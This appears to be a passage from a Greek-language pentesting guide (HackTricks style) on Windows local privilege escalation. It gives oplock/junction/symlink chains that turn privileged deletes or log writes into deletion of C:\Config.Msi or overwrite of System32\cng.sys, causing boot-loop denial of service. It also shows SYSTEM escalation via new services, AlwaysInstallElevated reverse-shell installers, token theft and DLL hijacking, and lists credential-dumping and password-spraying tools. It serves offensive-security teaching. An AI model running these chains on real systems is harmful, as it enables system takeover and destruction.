Τι γίνεται αν το primitive σου δεν σου επιτρέπει να διαγράψεις αυθαίρετα files/folders, αλλά αυτό **επιτρέπει τη διαγραφή του *contents* ενός attacker-controlled folder**;

1. Step 1: Δημιούργησε ένα bait folder και ένα file
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: Τοποθέτησε ένα **oplock** στο `file1.txt`
- Το oplock **παγώνει την εκτέλεση** όταν μια privileged process προσπαθεί να διαγράψει `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Βήμα 3: Ενεργοποίηση της διαδικασίας SYSTEM (π.χ., `SilentCleanup`)
- Αυτή η διαδικασία σαρώνει φακέλους (π.χ., `%TEMP%`) και προσπαθεί να διαγράψει το περιεχόμενό τους.
- Όταν φτάσει στο `file1.txt`, το **oplock triggers** και παραδίδει τον έλεγχο στο callback σας.

4. Βήμα 4: Μέσα στο oplock callback – ανακατεύθυνση της διαγραφής

- Επιλογή A: Μετακινήστε το `file1.txt` αλλού
- Αυτό αδειάζει τον `folder1` χωρίς να σπάσει το oplock.
- Μην διαγράψετε απευθείας το `file1.txt` — αυτό θα απελευθέρωνε το oplock πρόωρα.

- Επιλογή B: Μετατρέψτε τον `folder1` σε **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Επιλογή C: Δημιουργήστε ένα **symlink** στο `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Αυτό στοχεύει την εσωτερική ροή του NTFS που αποθηκεύει τα μεταδεδομένα του φακέλου — διαγράφοντάς την διαγράφεται ο φάκελος.

5. Βήμα 5: Απελευθέρωση του oplock
- Η διαδικασία SYSTEM συνεχίζει και προσπαθεί να διαγράψει `file1.txt`.
- Αλλά τώρα, λόγω του junction + symlink, στην πραγματικότητα διαγράφει:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Αποτέλεσμα**: `C:\Config.Msi` is deleted by SYSTEM.

### Από τη Δημιουργία Αυθαίρετου Φακέλου σε Μόνιμο DoS

Εκμεταλλευτείτε ένα primitive που σας επιτρέπει να **δημιουργήσετε έναν αυθαίρετο φάκελο ως SYSTEM/admin** — ακόμα κι αν **δεν μπορείτε να γράψετε αρχεία** ή **να ορίσετε αδύναμες permissions**.

Δημιουργήστε έναν **φάκελο** (όχι **αρχείο**) με το όνομα ενός **κρίσιμου Windows driver**, π.χ.:
```
C:\Windows\System32\cng.sys
```
- Αυτή η διαδρομή συνήθως αντιστοιχεί στον kernel-mode driver `cng.sys`.
- Αν την **δημιουργήσετε προ-προηγουμένως ως φάκελο**, τα Windows δεν καταφέρνουν να φορτώσουν τον πραγματικό driver κατά το boot.
- Στη συνέχεια, τα Windows προσπαθούν να φορτώσουν το `cng.sys` κατά το boot.
- Βλέπει τον φάκελο, **αποτυγχάνει να επιλύσει τον πραγματικό driver**, και **κρασάρει ή σταματάει το boot**.
- Δεν υπάρχει **fallback**, και **καμία ανάκτηση** χωρίς εξωτερική παρέμβαση (π.χ., επιδιόρθωση εκκίνησης ή πρόσβαση στο δίσκο).

### Από privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS

Όταν μια **privileged service** γράφει logs/exports σε μια διαδρομή που διαβάζεται από ένα **writable config**, ανακατευθύνετε εκείνη τη διαδρομή με **Object Manager symlinks + NTFS mount points** για να μετατρέψετε τη γραφή με προνόμια σε αυθαίρετη υπερχάραξη (ακόμα και **χωρίς** SeCreateSymbolicLinkPrivilege).

**Απαιτήσεις**
- Το config που αποθηκεύει τη στοχευόμενη διαδρομή να είναι εγγράψιμο από τον επιτιθέμενο (π.χ., `%ProgramData%\...\.ini`).
- Δυνατότητα δημιουργίας ενός mount point στο `\RPC Control` και ενός OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Μια privileged ενέργεια που γράφει σε εκείνη τη διαδρομή (log, export, report).

**Παράδειγμα αλυσίδας**
1. Διαβάστε το config για να ανακτήσετε τον προορισμό καταγραφής με προνόμια, π.χ. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` στο `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Ανακατευθύνετε τη διαδρομή χωρίς admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Περιμένετε το προνομιακό συστατικό να γράψει το log (π.χ., admin triggers "send test SMS"). Η εγγραφή τώρα καταλήγει σε `C:\Windows\System32\cng.sys`.
4. Ελέγξτε τον αντικατασταθέντα στόχο (hex/PE parser) για να επιβεβαιώσετε τη διαφθορά· η επανεκκίνηση αναγκάζει τα Windows να φορτώσουν το παραποιημένο driver path → **boot loop DoS**. Αυτό επίσης γενικεύεται σε οποιοδήποτε προστατευμένο αρχείο που μια υπηρεσία με προνόμια θα ανοίξει για εγγραφή.

> `cng.sys` is normally loaded from `C:\Windows\System32\drivers\cng.sys`, but if a copy exists in `C:\Windows\System32\cng.sys` it can be attempted first, making it a reliable DoS sink for corrupt data.



## **Από High Integrity σε System**

### **Νέα υπηρεσία**

Αν ήδη τρέχετε σε μια διεργασία High Integrity, η **διαδρομή προς SYSTEM** μπορεί να είναι εύκολη απλά δημιουργώντας και εκτελώντας μια νέα υπηρεσία:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Κατά τη δημιουργία ενός service binary βεβαιώσου ότι είναι μια έγκυρη υπηρεσία ή ότι το binary εκτελεί τις απαραίτητες ενέργειες γρήγορα, καθώς θα τερματιστεί σε 20s αν δεν είναι έγκυρη υπηρεσία.

### AlwaysInstallElevated

Από μια High Integrity διεργασία μπορείς να προσπαθήσεις να **enable the AlwaysInstallElevated registry entries** και να **install** ένα reverse shell χρησιμοποιώντας έναν _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Μπορείς** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Εάν έχεις αυτά τα token privileges (πιθανώς θα τα βρεις σε μια ήδη High Integrity διεργασία), θα μπορείς να **open almost any process** (not protected processes) με το SeDebug privilege, να **copy the token** της διεργασίας και να δημιουργήσεις μια **arbitrary process with that token**.\
Χρησιμοποιώντας αυτή την τεχνική συνήθως **επιλέγεται κάποια process που τρέχει ως SYSTEM με όλα τα token privileges** (_ναι, μπορείς να βρεις SYSTEM processes χωρίς όλα τα token privileges_).\
**Μπορείς να βρεις ένα** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Αυτή η τεχνική χρησιμοποιείται από το meterpreter για escalation στο `getsystem`. Η τεχνική συνίσταται στο **creating a pipe and then create/abuse a service to write on that pipe**. Στη συνέχεια, ο **server** που δημιούργησε το pipe χρησιμοποιώντας το **`SeImpersonate`** privilege θα είναι σε θέση να **impersonate the token** του pipe client (της υπηρεσίας), αποκτώντας SYSTEM privileges.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Εάν καταφέρεις να **hijack a dll** που **φορτώνεται** από μια **process** που τρέχει ως **SYSTEM**, θα μπορείς να εκτελέσεις arbitrary code με αυτά τα δικαιώματα. Επομένως το Dll Hijacking είναι χρήσιμο για αυτό το είδος privilege escalation και, επιπλέον, είναι κατά πολύ **πιο εύκολο να επιτευχθεί από μια high integrity process** καθώς θα έχει **write permissions** στους φακέλους που χρησιμοποιούνται για το φόρτωμα dlls.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Διάβασε:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Περισσότερη βοήθεια

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Χρήσιμα εργαλεία

**Καλύτερο εργαλείο για αναζήτηση Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Έλεγχος για misconfigurations και ευαίσθητα αρχεία (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Έλεγχος για μερικές πιθανές misconfigurations και συλλογή πληροφοριών (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Έλεγχος για misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Εξάγει αποθηκευμένες συνεδρίες PuTTY, WinSCP, SuperPuTTY, FileZilla, και RDP. Χρησιμοποίησε -Thorough τοπικά.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Εξάγει credentials από το Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray των συλλεγμένων κωδικών στο domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh είναι ένα PowerShell ADIDNS/LLMNR/mDNS spoofer και man-in-the-middle εργαλείο.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Βασική Windows privesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Αναζήτηση γνωστών privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Τοπικοί έλεγχοι **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Αναζήτηση γνωστών privesc vulnerabilities (χρειάζεται να μεταγλωττιστεί με VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Εντοπίζει προβλήματα στο host αναζητώντας misconfigurations (περισσότερο εργαλείο συλλογής πληροφοριών παρά privesc) (χρειάζεται να μεταγλωττιστεί) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Εξάγει credentials από πολλά προγράμματα (precompiled exe στο github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port του PowerUp σε C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Έλεγχος για misconfiguration (εκτελέσιμο precompiled στο github). Δεν συνιστάται. Δεν λειτουργεί καλά σε Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Έλεγχος για πιθανές misconfigurations (exe από python). Δεν συνιστάται. Δεν λειτουργεί καλά σε Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Εργαλείο βασισμένο σε αυτή την ανάρτηση (δεν χρειάζεται accesschk για να δουλεύει σωστά αλλά μπορεί να το χρησιμοποιήσει).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Διαβάζει το output του **systeminfo** και προτείνει διαθέσιμα exploits (τοπικό python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Διαβάζει το output του **systeminfo** και προτείνει διαθέσιμα exploits (τοπικό python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Πρέπει να μεταγλωττίσεις το project χρησιμοποιώντας τη σωστή έκδοση του .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Για να δεις την εγκατεστημένη έκδοση του .NET στο θύμα μπορείς να κάνεις:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Αναφορές

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer αποκρυπτογράφηση διαπιστευτηρίων → Veeam CVE-2023-27532 σε SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) και kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Κυνήγι της Silver Fox: Παιχνίδι Γάτας & Ποντικιού στις σκιές του kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Ευπάθεια Privileged File System παρούσα σε SCADA σύστημα](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – χρήση CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Κατάχρηση Symbolic Links στα Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
